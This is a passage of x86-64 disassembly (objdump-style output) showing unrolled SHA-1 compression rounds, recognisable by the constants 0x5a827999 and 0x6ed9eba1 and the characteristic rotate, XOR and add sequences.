  403b3d:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403b44:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  403b4b:	48 31 d0             	xor    %rdx,%rax
  403b4e:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  403b55:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  403b5c:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403b60:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  403b64:	48 01 c2             	add    %rax,%rdx
  403b67:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403b6e:	48 01 d0             	add    %rdx,%rax
  403b71:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403b77:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403b7e:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403b85:	48 c1 e0 1e          	shl    $0x1e,%rax
  403b89:	48 89 c2             	mov    %rax,%rdx
  403b8c:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403b93:	89 c0                	mov    %eax,%eax
  403b95:	48 c1 e8 02          	shr    $0x2,%rax
  403b99:	48 09 d0             	or     %rdx,%rax
  403b9c:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403ba3:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403baa:	48 c1 e0 05          	shl    $0x5,%rax
  403bae:	48 89 c2             	mov    %rax,%rdx
  403bb1:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403bb8:	89 c0                	mov    %eax,%eax
  403bba:	48 c1 e8 1b          	shr    $0x1b,%rax
  403bbe:	48 89 d1             	mov    %rdx,%rcx
  403bc1:	48 09 c1             	or     %rax,%rcx
  403bc4:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403bcb:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  403bd2:	48 31 d0             	xor    %rdx,%rax
  403bd5:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  403bdc:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  403be3:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403be7:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  403beb:	48 01 c2             	add    %rax,%rdx
  403bee:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403bf5:	48 01 d0             	add    %rdx,%rax
  403bf8:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403bfe:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403c05:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403c0c:	48 c1 e0 1e          	shl    $0x1e,%rax
  403c10:	48 89 c2             	mov    %rax,%rdx
  403c13:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403c1a:	89 c0                	mov    %eax,%eax
  403c1c:	48 c1 e8 02          	shr    $0x2,%rax
  403c20:	48 09 d0             	or     %rdx,%rax
  403c23:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403c2a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403c31:	48 c1 e0 05          	shl    $0x5,%rax
  403c35:	48 89 c2             	mov    %rax,%rdx
  403c38:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403c3f:	89 c0                	mov    %eax,%eax
  403c41:	48 c1 e8 1b          	shr    $0x1b,%rax
  403c45:	48 89 d1             	mov    %rdx,%rcx
  403c48:	48 09 c1             	or     %rax,%rcx
  403c4b:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403c52:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  403c59:	48 31 d0             	xor    %rdx,%rax
  403c5c:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  403c63:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  403c6a:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403c6e:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  403c72:	48 01 c2             	add    %rax,%rdx
  403c75:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403c7c:	48 01 d0             	add    %rdx,%rax
  403c7f:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403c85:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403c8c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403c93:	48 c1 e0 1e          	shl    $0x1e,%rax
  403c97:	48 89 c2             	mov    %rax,%rdx
  403c9a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403ca1:	89 c0                	mov    %eax,%eax
  403ca3:	48 c1 e8 02          	shr    $0x2,%rax
  403ca7:	48 09 d0             	or     %rdx,%rax
  403caa:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403cb1:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403cb8:	48 c1 e0 05          	shl    $0x5,%rax
  403cbc:	48 89 c2             	mov    %rax,%rdx
  403cbf:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403cc6:	89 c0                	mov    %eax,%eax
  403cc8:	48 c1 e8 1b          	shr    $0x1b,%rax
  403ccc:	48 89 d1             	mov    %rdx,%rcx
  403ccf:	48 09 c1             	or     %rax,%rcx
  403cd2:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403cd9:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  403ce0:	48 31 d0             	xor    %rdx,%rax
  403ce3:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  403cea:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  403cf1:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403cf5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  403cf9:	48 01 c2             	add    %rax,%rdx
  403cfc:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403d03:	48 01 d0             	add    %rdx,%rax
  403d06:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403d0c:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403d13:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403d1a:	48 c1 e0 1e          	shl    $0x1e,%rax
  403d1e:	48 89 c2             	mov    %rax,%rdx
  403d21:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403d28:	89 c0                	mov    %eax,%eax
  403d2a:	48 c1 e8 02          	shr    $0x2,%rax
  403d2e:	48 09 d0             	or     %rdx,%rax
  403d31:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403d38:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403d3f:	48 c1 e0 05          	shl    $0x5,%rax
  403d43:	48 89 c2             	mov    %rax,%rdx
  403d46:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403d4d:	89 c0                	mov    %eax,%eax
  403d4f:	48 c1 e8 1b          	shr    $0x1b,%rax
  403d53:	48 89 d1             	mov    %rdx,%rcx
  403d56:	48 09 c1             	or     %rax,%rcx
  403d59:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403d60:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  403d67:	48 31 d0             	xor    %rdx,%rax
  403d6a:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  403d71:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  403d78:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403d7c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  403d80:	48 01 c2             	add    %rax,%rdx
  403d83:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403d8a:	48 01 d0             	add    %rdx,%rax
  403d8d:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403d93:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403d9a:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403da1:	48 c1 e0 1e          	shl    $0x1e,%rax
  403da5:	48 89 c2             	mov    %rax,%rdx
  403da8:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403daf:	89 c0                	mov    %eax,%eax
  403db1:	48 c1 e8 02          	shr    $0x2,%rax
  403db5:	48 09 d0             	or     %rdx,%rax
  403db8:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403dbf:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403dc6:	48 c1 e0 05          	shl    $0x5,%rax
  403dca:	48 89 c2             	mov    %rax,%rdx
  403dcd:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403dd4:	89 c0                	mov    %eax,%eax
  403dd6:	48 c1 e8 1b          	shr    $0x1b,%rax
  403dda:	48 89 d1             	mov    %rdx,%rcx
  403ddd:	48 09 c1             	or     %rax,%rcx
  403de0:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403de7:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  403dee:	48 31 d0             	xor    %rdx,%rax
  403df1:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  403df8:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  403dff:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403e03:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403e07:	48 01 c2             	add    %rax,%rdx
  403e0a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403e11:	48 01 d0             	add    %rdx,%rax
  403e14:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403e1a:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403e21:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403e28:	48 c1 e0 1e          	shl    $0x1e,%rax
  403e2c:	48 89 c2             	mov    %rax,%rdx
  403e2f:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403e36:	89 c0                	mov    %eax,%eax
  403e38:	48 c1 e8 02          	shr    $0x2,%rax
  403e3c:	48 09 d0             	or     %rdx,%rax
  403e3f:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403e46:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403e4d:	48 c1 e0 05          	shl    $0x5,%rax
  403e51:	48 89 c2             	mov    %rax,%rdx
  403e54:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403e5b:	89 c0                	mov    %eax,%eax
  403e5d:	48 c1 e8 1b          	shr    $0x1b,%rax
  403e61:	48 89 d1             	mov    %rdx,%rcx
  403e64:	48 09 c1             	or     %rax,%rcx
  403e67:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403e6e:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  403e75:	48 31 d0             	xor    %rdx,%rax
  403e78:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  403e7f:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  403e86:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403e8a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  403e8e:	48 01 c2             	add    %rax,%rdx
  403e91:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403e98:	48 01 d0             	add    %rdx,%rax
  403e9b:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403ea1:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403ea8:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403eaf:	48 c1 e0 1e          	shl    $0x1e,%rax
  403eb3:	48 89 c2             	mov    %rax,%rdx
  403eb6:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403ebd:	89 c0                	mov    %eax,%eax
  403ebf:	48 c1 e8 02          	shr    $0x2,%rax
  403ec3:	48 09 d0             	or     %rdx,%rax
  403ec6:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403ecd:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403ed4:	48 c1 e0 05          	shl    $0x5,%rax
  403ed8:	48 89 c2             	mov    %rax,%rdx
  403edb:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403ee2:	89 c0                	mov    %eax,%eax
  403ee4:	48 c1 e8 1b          	shr    $0x1b,%rax
  403ee8:	48 89 d1             	mov    %rdx,%rcx
  403eeb:	48 09 c1             	or     %rax,%rcx
  403eee:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403ef5:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  403efc:	48 31 d0             	xor    %rdx,%rax
  403eff:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  403f06:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  403f0d:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403f11:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403f15:	48 01 c2             	add    %rax,%rdx
  403f18:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403f1f:	48 01 d0             	add    %rdx,%rax
  403f22:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403f28:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403f2f:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403f36:	48 c1 e0 1e          	shl    $0x1e,%rax
  403f3a:	48 89 c2             	mov    %rax,%rdx
  403f3d:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403f44:	89 c0                	mov    %eax,%eax
  403f46:	48 c1 e8 02          	shr    $0x2,%rax
  403f4a:	48 09 d0             	or     %rdx,%rax
  403f4d:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403f54:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  403f58:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  403f5c:	48 31 c2             	xor    %rax,%rdx
  403f5f:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  403f63:	48 31 c2             	xor    %rax,%rdx
  403f66:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  403f6a:	48 31 d0             	xor    %rdx,%rax
  403f6d:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  403f74:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403f7b:	48 c1 e0 05          	shl    $0x5,%rax
  403f7f:	48 89 c2             	mov    %rax,%rdx
  403f82:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403f89:	89 c0                	mov    %eax,%eax
  403f8b:	48 c1 e8 1b          	shr    $0x1b,%rax
  403f8f:	48 89 d1             	mov    %rdx,%rcx
  403f92:	48 09 c1             	or     %rax,%rcx
  403f95:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403f9c:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  403fa3:	48 31 d0             	xor    %rdx,%rax
  403fa6:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  403fad:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  403fb4:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403fb8:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  403fbf:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  403fc3:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  403fca:	89 c0                	mov    %eax,%eax
  403fcc:	48 c1 e8 1f          	shr    $0x1f,%rax
  403fd0:	48 09 c8             	or     %rcx,%rax
  403fd3:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  403fd7:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  403fdb:	48 01 c2             	add    %rax,%rdx
  403fde:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403fe5:	48 01 d0             	add    %rdx,%rax
  403fe8:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403fee:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403ff5:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403ffc:	48 c1 e0 1e          	shl    $0x1e,%rax
  404000:	48 89 c2             	mov    %rax,%rdx
  404003:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40400a:	89 c0                	mov    %eax,%eax
  40400c:	48 c1 e8 02          	shr    $0x2,%rax
  404010:	48 09 d0             	or     %rdx,%rax
  404013:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40401a:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  40401e:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  404022:	48 31 c2             	xor    %rax,%rdx
  404025:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  404029:	48 31 c2             	xor    %rax,%rdx
  40402c:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  404030:	48 31 d0             	xor    %rdx,%rax
  404033:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40403a:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404041:	48 c1 e0 05          	shl    $0x5,%rax
  404045:	48 89 c2             	mov    %rax,%rdx
  404048:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40404f:	89 c0                	mov    %eax,%eax
  404051:	48 c1 e8 1b          	shr    $0x1b,%rax
  404055:	48 89 d1             	mov    %rdx,%rcx
  404058:	48 09 c1             	or     %rax,%rcx
  40405b:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404062:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  404069:	48 31 d0             	xor    %rdx,%rax
  40406c:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  404073:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  40407a:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40407e:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404085:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404089:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404090:	89 c0                	mov    %eax,%eax
  404092:	48 c1 e8 1f          	shr    $0x1f,%rax
  404096:	48 09 c8             	or     %rcx,%rax
  404099:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  40409d:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  4040a1:	48 01 c2             	add    %rax,%rdx
  4040a4:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4040ab:	48 01 d0             	add    %rdx,%rax
  4040ae:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  4040b4:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4040bb:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4040c2:	48 c1 e0 1e          	shl    $0x1e,%rax
  4040c6:	48 89 c2             	mov    %rax,%rdx
  4040c9:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4040d0:	89 c0                	mov    %eax,%eax
  4040d2:	48 c1 e8 02          	shr    $0x2,%rax
  4040d6:	48 09 d0             	or     %rdx,%rax
  4040d9:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4040e0:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  4040e4:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4040e8:	48 31 c2             	xor    %rax,%rdx
  4040eb:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4040ef:	48 31 c2             	xor    %rax,%rdx
  4040f2:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4040f6:	48 31 d0             	xor    %rdx,%rax
  4040f9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404100:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404107:	48 c1 e0 05          	shl    $0x5,%rax
  40410b:	48 89 c2             	mov    %rax,%rdx
  40410e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404115:	89 c0                	mov    %eax,%eax
  404117:	48 c1 e8 1b          	shr    $0x1b,%rax
  40411b:	48 89 d1             	mov    %rdx,%rcx
  40411e:	48 09 c1             	or     %rax,%rcx
  404121:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404128:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  40412f:	48 31 d0             	xor    %rdx,%rax
  404132:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  404139:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  404140:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404144:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40414b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40414f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404156:	89 c0                	mov    %eax,%eax
  404158:	48 c1 e8 1f          	shr    $0x1f,%rax
  40415c:	48 09 c8             	or     %rcx,%rax
  40415f:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  404163:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  404167:	48 01 c2             	add    %rax,%rdx
  40416a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404171:	48 01 d0             	add    %rdx,%rax
  404174:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  40417a:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404181:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404188:	48 c1 e0 1e          	shl    $0x1e,%rax
  40418c:	48 89 c2             	mov    %rax,%rdx
  40418f:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404196:	89 c0                	mov    %eax,%eax
  404198:	48 c1 e8 02          	shr    $0x2,%rax
  40419c:	48 09 d0             	or     %rdx,%rax
  40419f:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4041a6:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  4041aa:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4041ae:	48 31 c2             	xor    %rax,%rdx
  4041b1:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  4041b5:	48 31 c2             	xor    %rax,%rdx
  4041b8:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4041bc:	48 31 d0             	xor    %rdx,%rax
  4041bf:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4041c6:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4041cd:	48 c1 e0 05          	shl    $0x5,%rax
  4041d1:	48 89 c2             	mov    %rax,%rdx
  4041d4:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4041db:	89 c0                	mov    %eax,%eax
  4041dd:	48 c1 e8 1b          	shr    $0x1b,%rax
  4041e1:	48 89 d1             	mov    %rdx,%rcx
  4041e4:	48 09 c1             	or     %rax,%rcx
  4041e7:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4041ee:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4041f5:	48 31 d0             	xor    %rdx,%rax
  4041f8:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  4041ff:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  404206:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40420a:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404211:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404215:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40421c:	89 c0                	mov    %eax,%eax
  40421e:	48 c1 e8 1f          	shr    $0x1f,%rax
  404222:	48 09 c8             	or     %rcx,%rax
  404225:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  404229:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  40422d:	48 01 c2             	add    %rax,%rdx
  404230:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404237:	48 01 d0             	add    %rdx,%rax
  40423a:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  404240:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404247:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40424e:	48 c1 e0 1e          	shl    $0x1e,%rax
  404252:	48 89 c2             	mov    %rax,%rdx
  404255:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40425c:	89 c0                	mov    %eax,%eax
  40425e:	48 c1 e8 02          	shr    $0x2,%rax
  404262:	48 09 d0             	or     %rdx,%rax
  404265:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  40426c:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  404270:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  404274:	48 31 c2             	xor    %rax,%rdx
  404277:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40427b:	48 31 c2             	xor    %rax,%rdx
  40427e:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  404282:	48 31 d0             	xor    %rdx,%rax
  404285:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40428c:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404293:	48 c1 e0 05          	shl    $0x5,%rax
  404297:	48 89 c2             	mov    %rax,%rdx
  40429a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4042a1:	89 c0                	mov    %eax,%eax
  4042a3:	48 c1 e8 1b          	shr    $0x1b,%rax
  4042a7:	48 89 d1             	mov    %rdx,%rcx
  4042aa:	48 09 c1             	or     %rax,%rcx
  4042ad:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4042b4:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4042bb:	48 31 d0             	xor    %rdx,%rax
  4042be:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  4042c5:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4042c9:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4042d0:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4042d4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4042db:	89 c0                	mov    %eax,%eax
  4042dd:	48 c1 e8 1f          	shr    $0x1f,%rax
  4042e1:	48 09 c8             	or     %rcx,%rax
  4042e4:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  4042e8:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4042ec:	48 01 c2             	add    %rax,%rdx
  4042ef:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4042f6:	48 01 d0             	add    %rdx,%rax
  4042f9:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4042ff:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404306:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40430d:	48 c1 e0 1e          	shl    $0x1e,%rax
  404311:	48 89 c2             	mov    %rax,%rdx
  404314:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40431b:	89 c0                	mov    %eax,%eax
  40431d:	48 c1 e8 02          	shr    $0x2,%rax
  404321:	48 09 d0             	or     %rdx,%rax
  404324:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  40432b:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
  40432f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  404333:	48 31 c2             	xor    %rax,%rdx
  404336:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  40433a:	48 31 c2             	xor    %rax,%rdx
  40433d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404341:	48 31 d0             	xor    %rdx,%rax
  404344:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40434b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404352:	48 c1 e0 05          	shl    $0x5,%rax
  404356:	48 89 c2             	mov    %rax,%rdx
  404359:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404360:	89 c0                	mov    %eax,%eax
  404362:	48 c1 e8 1b          	shr    $0x1b,%rax
  404366:	48 89 d1             	mov    %rdx,%rcx
  404369:	48 09 c1             	or     %rax,%rcx
  40436c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404373:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  40437a:	48 31 d0             	xor    %rdx,%rax
  40437d:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  404384:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404388:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40438f:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404393:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
